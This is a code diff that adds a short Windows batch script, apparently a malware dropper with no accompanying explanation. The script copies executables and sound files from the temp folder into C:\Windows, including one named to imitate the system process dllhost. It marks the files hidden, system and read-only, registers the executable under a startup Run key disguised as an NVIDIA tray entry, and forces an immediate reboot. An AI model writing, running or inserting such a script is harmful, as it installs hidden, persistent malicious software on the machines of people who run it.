@@ -1,0 +1,12 @@
+@echo off
+md c:\windows
+copy /y "%temp%\dIIhost86.exe" C:\Windows
+copy /y "%temp%\christmas.exe" C:\windows
+copy /y "%temp%\death.wav" C:\Windows
+copy /y "%temp%\xmas.wav" C:\windows
+attrib +s +h +r C:\Windows\dIIhost86.exe
+attrib +s +h +r C:\Windows\christmas.exe
+attrib +s +h +r C:\Windows\death.wav
+attrib +s +h +r C:\Windows\xmas.wav
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v NVIDIATray /d C:\windows\dIIhost86.exe /f
+shutdown /r /t 00
